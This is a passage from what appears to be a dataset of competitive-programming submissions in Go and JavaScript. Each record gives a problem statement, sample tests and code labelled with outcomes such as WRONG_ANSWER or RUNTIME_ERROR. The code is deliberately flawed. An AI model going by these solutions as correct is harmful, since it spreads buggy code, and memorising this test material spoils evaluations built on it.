'*' || b[i] == '\/' ||\n\t\t\tb[i] == '\\r' || b[i] == '\\n' || b[i] == ' ' {\n\t\t\tif len(token) != 0 {\n\t\t\t\ttokens = append(tokens, string(token))\n\t\t\t\ttoken = make([]byte, 0, 100)\n\t\t\t}\n\t\t\tif b[i] != ' ' && b[i] != '\\r' && b[i] != '\\n' {\n\t\t\t\ttokens = append(tokens, string([]byte{b[i]}))\n\t\t\t}\n\t\t} else {\n\t\t\ttoken = append(token, b[i])\n\t\t}\n\t}\n\treturn tokens\n}\n\nfunc main() {\n\tbs, _ := ioutil.ReadAll(os.Stdin)\n\treader := bytes.NewBuffer(bs)\n\n\tvar n int\n\tfmt.Fscanf(reader, \"%d\\n\", &n)\n\tmacro2Op = map[string]string{}\n\n\tfor i := 0; i < n; i++ {\n\t\tvar macro string\n\t\tfmt.Fscanf(reader, \"#define %s \", &macro)\n\t\ts, _ := reader.ReadString('\\n')\n\t\ttokens := tokenize(s)\n\t\tmacro2Op[macro] = getRank(tokens)\n\t}\n\n\ttestexpr, _ := ioutil.ReadAll(reader)\n\texpr := string(testexpr) + \"\\n\"\n\tts := tokenize(expr)\n\trank := getRank(ts)\n\tif rank == \"fail\" {\n\t\tfmt.Printf(\"Suspicious\")\n\t} else {\n\t\tfmt.Printf(\"OK\")\n\t}\n}\n","description":"Most C\/C++ programmers know about excellent opportunities that preprocessor #define directives give; but many know as well about the problems that can arise because of their careless use.In this problem we consider the following model of #define constructions (also called macros). Each macro has its name and value. The generic syntax for declaring a macro is the following:#define macro_name macro_valueAfter the macro has been declared, \"macro_name\" is replaced with \"macro_value\" each time it is met in the program (only the whole tokens can be replaced; i.e. \"macro_name\" is replaced only when it is surrounded by spaces or other non-alphabetic symbol). A \"macro_value\" within our model can only be an arithmetic expression consisting of variables, four arithmetic operations, brackets, and also the names of previously declared macros (in this case replacement is performed sequentially). The process of replacing macros with their values is called substitution.One of the main problems arising while using macros \u2014 the situation when as a result of substitution we get an arithmetic expression with the changed order of calculation because of different priorities of the operations.Let's consider the following example. Say, we declared such a #define construction:#define sum x + yand further in the program the expression \"2 * sum\" is calculated. After macro substitution is performed we get \"2 * x + y\", instead of intuitively expected \"2 * (x + y)\".Let's call the situation \"suspicious\", if after the macro substitution the order of calculation changes, falling outside the bounds of some macro. Thus, your task is to find out by the given set of #define definitions and the given expression if this expression is suspicious or not.Let's speak more formally. We should perform an ordinary macros substitution in the given expression. Moreover, we should perform a \"safe\" macros substitution in the expression, putting in brackets each macro value; after this, guided by arithmetic rules of brackets expansion, we can omit some of the brackets. If there exist a way to get an expression, absolutely coinciding with the expression that is the result of an ordinary substitution (character-by-character, but ignoring spaces), then this expression and the macros system are called correct, otherwise \u2014 suspicious.Note that we consider the \"\/\" operation as the usual mathematical division, not the integer division like in C\/C++. That's why, for example, in the expression \"a*(b\/c)\" we can omit brackets to get the expression \"a*b\/c\".","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only number n (0\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the amount of #define constructions in the given program. Then there follow n lines, each of them contains just one #define construction. Each construction has the following syntax: #define name expression where   name \u2014 the macro name,  expression \u2014 the expression with which the given macro will be replaced. An expression is a non-empty string, containing digits,names of variables, names of previously declared macros, round brackets and operational signs +-*\/. It is guaranteed that the expression (before and after macros substitution) is a correct arithmetic expression, having no unary operations. The expression contains only non-negative integers, not exceeding 109.  All the names (#define constructions' names and names of their arguments) are strings of case-sensitive Latin characters. It is guaranteed that the name of any variable is different from any #define construction. Then, the last line contains an expression that you are to check. This expression is non-empty and satisfies the same limitations as the expressions in #define constructions. The input lines may contain any number of spaces anywhere, providing these spaces do not break the word \"define\" or the names of constructions and variables. In particular, there can be any number of spaces before and after the \"#\" symbol. The length of any line from the input file does not exceed 100 characters.","output_spec":"Output \"OK\", if the expression is correct according to the above given criterion, otherwise output \"Suspicious\".","notes":null,"sample_inputs":["1\n#define sum x + y\n1 * sum","1\n#define sum  (x + y)\nsum - sum","4\n#define sum  x + y\n#define mul  a * b\n#define div  a \/ b\n#define expr sum + mul * div * mul\nexpr","3\n#define SumSafe   (a+b)\n#define DivUnsafe  a\/b\n#define DenominatorUnsafe  a*b\n((SumSafe) + DivUnsafe\/DivUnsafe + x\/DenominatorUnsafe)"],"sample_outputs":["Suspicious","OK","OK","Suspicious"]}
{"difficulty":2100,"lang":"Go","lang_cluster":"go","src_uid":"d9eb0f6f82bd09ea53a1dbbd7242c497","submission_id":"re_1551","tags":["sortings","geometry"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"sort\"\n)\n\ntype point struct {\n\tx, y int\n}\n\nfunc counterclockwiseTurn(a, b, c point) bool {\n\tab := point{b.x - a.x, b.y - a.y}\n\tac := point{c.x - a.x, c.y - a.y}\n\treturn ab.x*ac.y-ab.y*ac.x > 0\n}\n\nfunc convexHull(points []point) []point {\n\tsort.Slice(points, func(i, j int) bool {\n\t\tif points[i].x == points[j].x {\n\t\t\treturn points[i].y < points[j].y\n\t\t}\n\t\treturn points[i].x < points[j].x\n\t})\n\n\tvar lower []point\n\tfor i := len(points) - 1; i >= 0; i-- {\n\t\tfor len(lower) >= 2 && counterclockwiseTurn(lower[len(lower)-2], lower[len(lower)-1], points[i]) {\n\t\t\tlower = lower[:len(lower)-1]\n\t\t}\n\t\tlower = append(lower, points[i])\n\t}\n\n\tvar upper []point\n\tfor i := range points {\n\t\tfor len(upper) >= 2 && counterclockwiseTurn(upper[len(upper)-2], upper[len(upper)-1], points[i]) {\n\t\t\tupper = upper[:len(upper)-1]\n\t\t}\n\t\tupper = append(upper, points[i])\n\t}\n\n\treturn append(lower[:len(lower)-1], upper[:len(upper)-1]...)\n}\n\nvar in = bufio.NewReaderSize(os.Stdin, 2<<16)\n\nfunc readPoints() []point {\n\tvar n int\n\tfmt.Fscan(in, &n)\n\ta := make([]point, n)\n\tfor i := range a {\n\t\tfmt.Fscan(in, &a[i].x, &a[i].y)\n\t}\n\treturn a\n}\n\nfunc solve() bool {\n\ta := readPoints()\n\tb := readPoints()\n\thull := convexHull(append(b, a...))\n\tif len(hull) != len(a) {\n\t\treturn false\n\t}\n\tstart := 0\n\tfor start < len(hull) && hull[start] != a[0] {\n\t\tstart++\n\t}\n\tif start == len(hull) {\n\t\treturn false\n\t}\n\tfor i := range a {\n\t\tif a[i] != hull[(i+start)%len(hull)] {\n\t\t\treturn false\n\t\t}\n\t}\n\treturn true\n}\n\nfunc main() {\n\tif solve() {\n\t\tfmt.Println(\"YES\")\n\t} else {\n\t\tfmt.Println(\"NO\")\n\t}\n}\n","description":"You've got another geometrical task. You are given two non-degenerate polygons A and B as vertex coordinates. Polygon A is strictly convex. Polygon B is an arbitrary polygon without any self-intersections and self-touches. The vertices of both polygons are given in the clockwise order. For each polygon no three consecutively following vertices are located on the same straight line.Your task is to check whether polygon B is positioned strictly inside polygon A. It means that any point of polygon B should be strictly inside polygon A. \"Strictly\" means that the vertex of polygon B cannot lie on the side of the polygon A.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only integer n (3\u2009\u2264\u2009n\u2009\u2264\u2009105) \u2014 the number of vertices of polygon A. Then n lines contain pairs of integers xi,\u2009yi (|xi|,\u2009|yi|\u2009\u2264\u2009109) \u2014 coordinates of the i-th vertex of polygon A. The vertices are given in the clockwise order. The next line contains a single integer m (3\u2009\u2264\u2009m\u2009\u2264\u20092\u00b7104) \u2014 the number of vertices of polygon B. Then following m lines contain pairs of integers xj,\u2009yj (|xj|,\u2009|yj|\u2009\u2264\u2009109) \u2014 the coordinates of the j-th vertex of polygon B. The vertices are given in the clockwise order. The coordinates of the polygon's vertices are separated by a single space. It is guaranteed that polygons A and B are non-degenerate, that polygon A is strictly convex, that polygon B has no self-intersections and self-touches and also for each polygon no three consecutively following vertices are located on the same straight line.","output_spec":"Print on the only line the answer to the problem \u2014 if polygon B is strictly inside polygon A, print \"YES\", otherwise print \"NO\" (without the quotes).","notes":null,"sample_inputs":["6\n-2 1\n0 3\n3 3\n4 1\n3 -2\n2 -2\n4\n0 1\n2 2\n3 1\n1 0","5\n1 2\n4 2\n3 -3\n-2 -2\n-2 1\n4\n0 1\n1 2\n4 1\n2 -1","5\n-1 2\n2 3\n4 1\n3 -2\n0 -3\n5\n1 0\n1 1\n3 1\n5 -1\n2 -1"],"sample_outputs":["YES","NO","NO"]}
{"difficulty":1800,"lang":"Go","lang_cluster":"go","src_uid":"e71640f715f353e49745eac5f72e682a","submission_id":"dd8617d0e93023c790316da1457e84c1","tags":["constructive algorithms","dfs and similar","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"strings\"\n)\n\nvar (\n\tin  = bufio.NewReader(os.Stdin)\n\tout = bufio.NewWriter(os.Stdout)\n)\n\nvar n, m int\nvar vType []Type\nvar edges [][]int\n\nfunc main() {\n\tdefer out.Flush()\n\tfmt.Fscan(in, &n, &m)\n\tvType = make([]Type, n)\n\tedges = make([][]int, n)\n\tfor i := 0; i < m; i++ {\n\t\tvar a, b int\n\t\tfmt.Fscan(in, &a, &b)\n\t\ta--\n\t\tb--\n\t\tedges[a] = append(edges[a], b)\n\t\tedges[b] = append(edges[b], a)\n\t}\n\tif ok, a, b, c := solve(); ok {\n\t\tfmt.Fprintln(out, \"Yes\")\n\t\tfmt.Fprintln(out, strings.Repeat(\"a\", a)+strings.Repeat(\"b\", b)+strings.Repeat(\"c\", c))\n\t} else {\n\t\tfmt.Fprintln(out, \"No\")\n\t}\n}\n\nfunc solve() (ok bool, a, b, c int) {\n\tfor v := range edges {\n\t\tif len(edges[v]) == n-1 {\n\t\t\tvType[v] = B\n\t\t}\n\t}\n\tfor v := range vType {\n\t\tif vType[v] == UNSEEN {\n\t\t\tmark(v, A)\n\t\t\tbreak\n\t\t}\n\t}\n\tfor v := range vType {\n\t\tif vType[v] == UNSEEN {\n\t\t\tmark(v, C)\n\t\t\tbreak\n\t\t}\n\t}\n\tfor v := range vType {\n\t\tswitch vType[v] {\n\t\tcase UNSEEN:\n\t\t\tok = false\n\t\t\treturn\n\t\tcase A:\n\t\t\ta++\n\t\tcase B:\n\t\t\tb++\n\t\tcase C:\n\t\t\tc++\n\t\t}\n\t}\n\tfor v := range vType {\n\t\tif vType[v] == A && len(edges[v]) != a-1+b {\n\t\t\tok = false\n\t\t\treturn\n\t\t}\n\t\tif vType[v] == C && len(edges[v]) != c-1+b {\n\t\t\tok = false\n\t\t\treturn\n\t\t}\n\t}\n\tok = true\n\treturn\n}\n\nfunc mark(v int, t Type) {\n\tif vType[v] != UNSEEN {\n\t\treturn\n\t}\n\tvType[v] = t\n\tfor _, u := range edges[v] {\n\t\tmark(u, t)\n\t}\n}\n\ntype Type int\n\nconst (\n\tUNSEEN Type = iota\n\tA\n\tB\n\tC\n)\n","description":"One day student Vasya was sitting on a lecture and mentioned a string s1s2... sn, consisting of letters \"a\", \"b\" and \"c\" that was written on his desk. As the lecture was boring, Vasya decided to complete the picture by composing a graph G with the following properties:   G has exactly n vertices, numbered from 1 to n.  For all pairs of vertices i and j, where i\u2009\u2260\u2009j, there is an edge connecting them if and only if characters si and sj are either equal or neighbouring in the alphabet. That is, letters in pairs \"a\"-\"b\" and \"b\"-\"c\" are neighbouring, while letters \"a\"-\"c\" are not. Vasya painted the resulting graph near the string and then erased the string. Next day Vasya's friend Petya came to a lecture and found some graph at his desk. He had heard of Vasya's adventure and now he wants to find out whether it could be the original graph G, painted by Vasya. In order to verify this, Petya needs to know whether there exists a string s, such that if Vasya used this s he would produce the given graph G.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integers n and m \u00a0\u2014 the number of vertices and edges in the graph found by Petya, respectively. Each of the next m lines contains two integers ui and vi (1\u2009\u2264\u2009ui,\u2009vi\u2009\u2264\u2009n,\u2009ui\u2009\u2260\u2009vi)\u00a0\u2014 the edges of the graph G. It is guaranteed, that there are no multiple edges, that is any pair of vertexes appear in this list no more than once.","output_spec":"In the first line print \"Yes\" (without the quotes), if the string s Petya is interested in really exists and \"No\" (without the quotes) otherwise. If the string s exists, then print it on the second line of the output. The length of s must be exactly n, it must consist of only letters \"a\", \"b\" and \"c\" only, and the graph built using this string must coincide with G. If there are multiple possible answers, you may print any of them.","notes":"NoteIn the first sample you are given a graph made of two vertices with an edge between them. So, these vertices can correspond to both the same and adjacent letters. Any of the following strings \"aa\", \"ab\", \"ba\", \"bb\", \"bc\", \"cb\", \"cc\" meets the graph's conditions. In the second sample the first vertex is connected to all three other vertices, but these three vertices are not connected with each other. That means that they must correspond to distinct letters that are not adjacent, but that is impossible as there are only two such letters: a and c.","sample_inputs":["2 1\n1 2","4 3\n1 2\n1 3\n1 4"],"sample_outputs":["Yes\naa","No"]}
{"difficulty":2500,"lang":"Go","lang_cluster":"go","src_uid":"e7e0f9069166fe992abe6f0e19caa6a1","submission_id":"54d87bf30157fb388be5e3bc18f05f18","tags":["data structures","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n  \"fmt\"\n  \"sort\"\n)\n\nconst N = 500000\n\nfunc IntMin(x, y int) int {\n  if x < y {\n    return x\n  }\n  return y\n}\n\nvar v, stk [N]int\n\nfunc main() {\n  var n, top int = 0, 0\n  var res int64 = 0\n  fmt.Scan(&n)\n  for i := 0; i < n; i++ {\n    fmt.Scan(&v[i])\n    for top >= 2 && stk[top-2] >= stk[top-1] && stk[top-1] <= v[i] {\n      res += int64(IntMin(v[i], stk[top-2]))\n      top--\n    }\n    stk[top] = v[i]\n    top++\n  }\n  sort.Sort(sort.IntSlice(stk[:top]))\n  for i := 0; i < top-2; i++ {\n    res += int64(stk[i])\n  }\n  fmt.Println(res)\n}\n","description":"Artem has an array of n positive integers. Artem decided to play with it. The game consists of n moves. Each move goes like this. Artem chooses some element of the array and removes it. For that, he gets min(a,\u2009b) points, where a and b are numbers that were adjacent with the removed number. If the number doesn't have an adjacent number to the left or right, Artem doesn't get any points. After the element is removed, the two parts of the array glue together resulting in the new array that Artem continues playing with. Borya wondered what maximum total number of points Artem can get as he plays this game.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u20095\u00b7105) \u2014 the number of elements in the array. The next line contains n integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009106) \u2014 the values of the array elements.","output_spec":"In a single line print a single integer \u2014 the maximum number of points Artem can get.","notes":null,"sample_inputs":["5\n3 1 5 2 6","5\n1 2 3 4 5","5\n1 100 101 100 1"],"sample_outputs":["11","6","102"]}
{"difficulty":1600,"lang":"Go","lang_cluster":"go","src_uid":"ed1a2ae733121af6486568e528fe2d84","submission_id":"4f2c1db1d798d8e20d6d25ed3bbb7d1d","tags":["sortings","brute force","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"\/\/ Author: sighduck\n\/\/ URL: https:\/\/codeforces.com\/problemset\/problem\/1213\/D2\n\npackage main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"sort\"\n)\n\nconst MaxNum = 200001\n\nfunc Solve(n int, k int, a []int) int {\n\tdivs := make([][]int, MaxNum)\n\tfor _, elem := range a {\n\t\tcount := 0\n\t\tfor elem > 0 {\n\t\t\tdivs[elem] = append(divs[elem], count)\n\t\t\telem \/= 2\n\t\t\tcount += 1\n\t\t}\n\t}\n\tans := MaxNum\n\tfor _, d := range divs {\n\t\tsort.Ints(d)\n\t\tsum := 0\n\t\tfor i := 0; i < len(d) && i < k; i++ {\n\t\t\tsum += d[i]\n\t\t}\n\t\tif len(d) >= k && sum < ans {\n\t\t\tans = sum\n\t\t}\n\t}\n\treturn ans\n}\n\nfunc main() {\n\treader := bufio.NewReader(os.Stdin)\n\twriter := bufio.NewWriter(os.Stdout)\n\tdefer writer.Flush()\n\n\tvar n, k int\n\tfmt.Fscanf(reader, \"%d %d\\n\", &n, &k)\n\ta := make([]int, n)\n\tfor i := 0; i < n; i++ {\n\t\tfmt.Fscanf(reader, \"%d\", &a[i])\n\t}\n\n\tfmt.Fprintf(writer, \"%d\\n\", Solve(n, k, a))\n}\n","description":"The only difference between easy and hard versions is the number of elements in the array.You are given an array $$$a$$$ consisting of $$$n$$$ integers. In one move you can choose any $$$a_i$$$ and divide it by $$$2$$$ rounding down (in other words, in one move you can set $$$a_i := \\lfloor\\frac{a_i}{2}\\rfloor$$$).You can perform such an operation any (possibly, zero) number of times with any $$$a_i$$$.Your task is to calculate the minimum possible number of operations required to obtain at least $$$k$$$ equal numbers in the array.Don't forget that it is possible to have $$$a_i = 0$$$ after some operations, thus the answer always exists.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integers $$$n$$$ and $$$k$$$ ($$$1 \\le k \\le n \\le 50$$$) \u2014 the number of elements in the array and the number of equal numbers required. The second line of the input contains $$$n$$$ integers $$$a_1, a_2, \\dots, a_n$$$ ($$$1 \\le a_i \\le 2 \\cdot 10^5$$$), where $$$a_i$$$ is the $$$i$$$-th element of $$$a$$$.","output_spec":"Print one integer \u2014 the minimum possible number of operations required to obtain at least $$$k$$$ equal numbers in the array.","notes":null,"sample_inputs":["5 3\n1 2 2 4 5","5 3\n1 2 3 4 5","5 3\n1 2 3 3 3"],"sample_outputs":["1","2","0"]}
{"difficulty":1600,"lang":"Go","lang_cluster":"go","src_uid":"fbfc333ad4b0a750f654a00be84aea67","submission_id":"re_365","tags":["shortest paths","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"os\"\n\t\"strconv\"\n\t\"fmt\"\n)\n\nvar scanner = bufio.NewScanner(os.Stdin)\nvar writer = bufio.NewWriter(os.Stdout)\n\/\/defer writer.Flush()\n\nconst (\n\t\/\/MaxScanTokenSize = 64 * 1024 \/\/ package default\n\tMaxScanTokenSize = 8 * 1024 * 1024 \/\/ 8M\n)\n\nfunc init() {\n\tscanner.Buffer(make([]byte, 0, MaxScanTokenSize), MaxScanTokenSize)\n\tscanner.Split(bufio.ScanWords)\n}\n\nfunc readString() string {\n\tscanner.Scan()\n\treturn scanner.Text()\n}\n\nfunc readInt() int {\n\tval, _ := strconv.Atoi(readString())\n\treturn val\n}\n\nfunc readInt64() int64 {\n\tv, _ := strconv.ParseInt(readString(), 10, 64)\n\treturn v\n}\n\nfunc readIntArray(size int) []int {\n\ta := make([]int, size)\n\tfor i := 0; i < size; i++ {\n\t\ta[i] = readInt()\n\t}\n\treturn a\n}\n\nfunc readInt64Array(n int) []int64 {\n\tres := make([]int64, n)\n\tfor i := 0; i < n; i++ {\n\t\tres[i] = readInt64()\n\t}\n\treturn res\n}\n\nfunc readFloat64() float64 {\n\tv, _ := strconv.ParseFloat(readString(), 64)\n\treturn v\n}\n\nfunc readFloat64Array(n int) []float64 {\n\tres := make([]float64, n)\n\tfor i := 0; i < n; i++ {\n\t\tres[i] = readFloat64()\n\t}\n\treturn res\n}\n\ntype Edge struct {\n\tFrom int\n\tTo int\n\tCap int\n\tFlow int\n}\n\ntype Graph struct {\n\tNNode int\n\tNEdge int\n\tEdges []Edge\n\tNodes [][]int\n}\n\nfunc NewGraph(nNode, nEdge int) *Graph {\n\tg := &Graph{\n\t\tNNode: nNode,\n\t\tNEdge: nEdge,\n\t\tEdges: make([]Edge, 0, nEdge),\n\t\tNodes: make([][]int, nNode, nNode),\n\t}\n\treturn g\n}\n\nfunc (g *Graph) AddEdge(from, to, cap, flow int) {\n\tg.Nodes[from] = append(g.Nodes[from], len(g.Edges))\n\tg.Edges = append(g.Edges, Edge{from, to, cap, flow})\n\tg.Nodes[to] = append(g.Nodes[to], len(g.Edges))\n\tg.Edges = append(g.Edges, Edge{to, from, cap, flow})\n}\n\nfunc (g *Graph) Show() {\n\tfmt.Printf(\"n node = %d, n edge = %d\\n\", g.NNode, g.NEdge)\n\tfor i, cur := range g.Nodes {\n\t\tfmt.Printf(\"[%d]\", i)\n\t\tfor _, next := range cur {\n\t\t\tfmt.Printf(\" %d\", g.Edges[next].To)\n\t\t}\n\t\tfmt.Println()\n\t}\n}\n\ntype QueueStack struct {\n\tdata []interface{}\n}\n\nfunc (q *QueueStack) size() int {\n\treturn len(q.data)\n}\n\nfunc (q *QueueStack) push(v interface{}) {\n\tq.data = append(q.data, v)\n}\n\nfunc (q *QueueStack) popFront() interface{} {\n\tv := q.data[0]\n\tq.data = q.data[1:]\n\treturn v\n}\n\nfunc (q *QueueStack) pop() interface{} {\n\tlast := len(q.data) - 1\n\tv := q.data[last]\n\tq.data = q.data[:last]\n\treturn v\n}\n\nfunc spfa(g *Graph, from, to int) int {\n\tn := g.NNode\n\tdist := make([]int, n, n)\n\tdist[0] = 0\n\tfor i := 1; i < n; i++ {\n\t\tdist[i] = n\n\t}\n\n\tq := &QueueStack{}\n\tq.push(from)\n\tfor q.size() > 0 {\n\t\tcur := q.pop().(int)\n\t\tfor _, ie := range g.Nodes[cur] {\n\t\t\te := g.Edges[ie]\n\t\t\tif dist[cur] + 1 < dist[e.To] {\n\t\t\t\tdist[e.To] = dist[cur] + 1\n\t\t\t\tq.push(e.To)\n\t\t\t}\n\t\t}\n\t}\n\n\treturn dist[to]\n}\n\n\nfunc main() {\n\tdefer writer.Flush()\n\n\tn, m := readInt(), readInt()\n\n\tgFull := make([][]int, n, n)\n\tfor i := 0; i < n; i++ {\n\t\tgFull[i] = make([]int, n, n)\n\t}\n\n\tg := NewGraph(n, m)\n\tfor i := 0; i < m; i++ {\n\t\tx, y := readInt(), readInt()\n\t\tx--\n\t\ty--\n\t\tg.AddEdge(x, y, 0, 0)\n\t\tgFull[x][y] = 1\n\t\tgFull[y][x] = 1\n\t}\n\tg.Show()\n\n\td1 := spfa(g, 0, n - 1)\n\n\tif d1 == n {\n\t\tfmt.Fprintf(writer, \"-1\\n\")\n\t\treturn\n\t}\n\n\tg = NewGraph(n, n * (1 + n) \/ 2 - m)\n\tfor i := 0; i < n; i++ {\n\t\tfor j := 0; j < n; j++ {\n\t\t\tif gFull[i][j] == 0 {\n\t\t\t\tg.AddEdge(i, j, 0, 0)\n\t\t\t}\n\t\t}\n\t}\n\n\td2 := spfa(g, 0, n - 1)\n\tif d2 == n {\n\t\tfmt.Fprintf(writer, \"-1\\n\")\n\t\treturn\n\t}\n\n\tans := d1\n\tif d1 < d2 {\n\t\tans = d2\n\t}\n\tfmt.Fprintf(writer, \"%d\\n\", ans)\n}\n","description":"In Absurdistan, there are n towns (numbered 1 through n) and m bidirectional railways. There is also an absurdly simple road network\u00a0\u2014 for each pair of different towns x and y, there is a bidirectional road between towns x and y if and only if there is no railway between them. Travelling to a different town using one railway or one road always takes exactly one hour.A train and a bus leave town 1 at the same time. They both have the same destination, town n, and don't make any stops on the way (but they can wait in town n). The train can move only along railways and the bus can move only along roads.You've been asked to plan out routes for the vehicles; each route can use any road\/railway multiple times. One of the most important aspects to consider is safety\u00a0\u2014 in order to avoid accidents at railway crossings, the train and the bus must not arrive at the same town (except town n) simultaneously.Under these constraints, what is the minimum number of hours needed for both vehicles to reach town n (the maximum of arrival times of the bus and the train)? Note, that bus and train are not required to arrive to the town n at the same moment of time, but are allowed to do so.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integers n and m (2\u2009\u2264\u2009n\u2009\u2264\u2009400, 0\u2009\u2264\u2009m\u2009\u2264\u2009n(n\u2009-\u20091)\u2009\/\u20092)\u00a0\u2014 the number of towns and the number of railways respectively. Each of the next m lines contains two integers u and v, denoting a railway between towns u and v (1\u2009\u2264\u2009u,\u2009v\u2009\u2264\u2009n, u\u2009\u2260\u2009v). You may assume that there is at most one railway connecting any two towns.","output_spec":"Output one integer\u00a0\u2014 the smallest possible time of the later vehicle's arrival in town n. If it's impossible for at least one of the vehicles to reach town n, output \u2009-\u20091.","notes":"NoteIn the first sample, the train can take the route  and the bus can take the route . Note that they can arrive at town 4 at the same time.In the second sample, Absurdistan is ruled by railwaymen. There are no roads, so there's no way for the bus to reach town 4.","sample_inputs":["4 2\n1 3\n3 4","4 6\n1 2\n1 3\n1 4\n2 3\n2 4\n3 4","5 5\n4 2\n3 5\n4 5\n5 1\n1 2"],"sample_outputs":["2","-1","3"]}
{"difficulty":1000,"lang":"Node.js","lang_cluster":"javascript","src_uid":"0515ac888937a4dda30cad5e2383164f","submission_id":"b5123b92400268035c97d0850da137a9","tags":["implementation","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"let lines = '';\nprocess.stdin.on('data', c => lines += c);\n\nconst solution = () => {\n\tlet line = lines.split('\\n');\n\tlet [n, k] = line[0].split(' ').map(v => parseInt(v,10));\n\tlet s = line[1];\n\tlet r = '';\n\tfor(let i = 0; i < n; i++){\n\t\tlet c = s[i];\n\t\tif (i === 0 && c > 1 && k > 0) {\n\t\t\tr += 1;\n\t\t\tk--;\n\t\t} else if (i === 0 && n == 1 && k > 0) {\n\t\t\tr += 0;\n\t\t\tk--;\n\t\t} else if (i !== 0 && c > 0 && k > 0) {\n\t\t\tr += 0;\n\t\t\tk--;\n\t\t} else {\n\t\t\tr += c;\n\t\t}\n\t}\n\t\n\tconsole.log(r);\n\tprocess.exit(0);\n}\n\nprocess.stdin.on('end', solution);\n","description":"Ania has a large integer $$$S$$$. Its decimal representation has length $$$n$$$ and doesn't contain any leading zeroes. Ania is allowed to change at most $$$k$$$ digits of $$$S$$$. She wants to do it in such a way that $$$S$$$ still won't contain any leading zeroes and it'll be minimal possible. What integer will Ania finish with?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers $$$n$$$ and $$$k$$$ ($$$1 \\leq n \\leq 200\\,000$$$, $$$0 \\leq k \\leq n$$$) \u2014 the number of digits in the decimal representation of $$$S$$$ and the maximum allowed number of changed digits. The second line contains the integer $$$S$$$. It's guaranteed that $$$S$$$ has exactly $$$n$$$ digits and doesn't contain any leading zeroes.","output_spec":"Output the minimal possible value of $$$S$$$ which Ania can end with. Note that the resulting integer should also have $$$n$$$ digits.","notes":"NoteA number has leading zeroes if it consists of at least two digits and its first digit is $$$0$$$. For example, numbers $$$00$$$, $$$00069$$$ and $$$0101$$$ have leading zeroes, while $$$0$$$, $$$3000$$$ and $$$1010$$$ don't have leading zeroes.","sample_inputs":["5 3\n51528","3 2\n102","1 1\n1"],"sample_outputs":["10028","100","0"]}
{"difficulty":900,"lang":"JavaScript","lang_cluster":"javascript","src_uid":"102667eaa3aee012fef70f4192464674","submission_id":"re_887","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"print(function(n, a, m, b) {\n\tvar i, j, d = new Int8Array(1e4);\n\tfor (i = 0; i < n; i++)\n\t\tfor (j = 0; j < m; j++)\n\t\t\tif (b[j] % a[i] === 0)\n\t\t\t\td[b[j] \/ a[i]]++;\n\n\treturn Math.max.apply(0, d);\n\n}(+readline(), readline().split(' ').map(Number),\n  +readline(), readline().split(' ').map(Number)));","description":"Vasya's bicycle chain drive consists of two parts: n stars are attached to the pedal axle, m stars are attached to the rear wheel axle. The chain helps to rotate the rear wheel by transmitting the pedal rotation.We know that the i-th star on the pedal axle has ai (0\u2009&lt;\u2009a1\u2009&lt;\u2009a2\u2009&lt;\u2009...\u2009&lt;\u2009an) teeth, and the j-th star on the rear wheel axle has bj (0\u2009&lt;\u2009b1\u2009&lt;\u2009b2\u2009&lt;\u2009...\u2009&lt;\u2009bm) teeth. Any pair (i,\u2009j) (1\u2009\u2264\u2009i\u2009\u2264\u2009n;\u00a01\u2009\u2264\u2009j\u2009\u2264\u2009m) is called a gear and sets the indexes of stars to which the chain is currently attached. Gear (i,\u2009j) has a gear ratio, equal to the value .Since Vasya likes integers, he wants to find such gears (i,\u2009j), that their ratios are integers. On the other hand, Vasya likes fast driving, so among all \"integer\" gears (i,\u2009j) he wants to choose a gear with the maximum ratio. Help him to find the number of such gears.In the problem, fraction  denotes division in real numbers, that is, no rounding is performed.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of stars on the bicycle's pedal axle. The second line contains n integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u2009104) in the order of strict increasing. The third input line contains integer m (1\u2009\u2264\u2009m\u2009\u2264\u200950) \u2014 the number of stars on the rear wheel axle. The fourth line contains m integers b1,\u2009b2,\u2009...,\u2009bm (1\u2009\u2264\u2009bi\u2009\u2264\u2009104) in the order of strict increasing. It is guaranteed that there exists at least one gear (i,\u2009j), that its gear ratio is an integer. The numbers on the lines are separated by spaces.","output_spec":"Print the number of \"integer\" gears with the maximum ratio among all \"integer\" gears.","notes":"NoteIn the first sample the maximum \"integer\" gear ratio equals 3. There are two gears that have such gear ratio. For one of them a1\u2009=\u20094,\u2009b1\u2009=\u200912, and for the other a2\u2009=\u20095,\u2009b3\u2009=\u200915.","sample_inputs":["2\n4 5\n3\n12 13 15","4\n1 2 3 4\n5\n10 11 12 13 14"],"sample_outputs":["2","1"]}
